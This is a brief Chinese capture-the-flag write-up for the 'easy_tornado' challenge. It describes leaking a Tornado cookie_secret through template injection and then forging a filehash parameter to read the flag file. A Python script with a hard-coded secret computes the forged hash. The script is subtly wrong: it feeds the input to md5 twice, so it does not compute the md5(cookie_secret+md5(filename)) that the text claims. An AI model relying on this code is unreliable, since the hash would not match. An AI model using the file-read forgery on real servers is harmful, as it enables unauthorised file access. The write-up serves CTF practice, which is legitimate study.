easy_tornado

welcome.txt的页面提示render，就想到了模板注入，flag.txt中告诉了flag文件的位置，hint.txt提示md5(cookie_secret+md5(filename))。

就是说要通过模板注入找到cookie_secret,然后编写python脚本将flag_name进行md5加密，
最后总体加密。同时观察hint.txt的url发现

file?filename=/hints.txt&filehash=c4d9e17f8cdc1e065a1af55625ffca16

那么最终就是：

file?filename=/fllllllllllllag&filehash=md5(cookie_secret+md5(filename))

python脚本：

 import hashlib

def hash(value):
    md5 = hashlib.md5(value)
    md5.update(value)
    result = md5.hexdigest()
    return result

def jiami():
    filename = '/fllllllllllllag'
    cookie_S = 'de639f1e-0c39-46e5-b8cb-1cd29f56aea3'
    print(hash(filename.encode('utf-8')))
    x = hash(filename.encode('utf-8'))
    y = cookie_S +x
    print(hash(y.encode('utf-8')))

jiami()
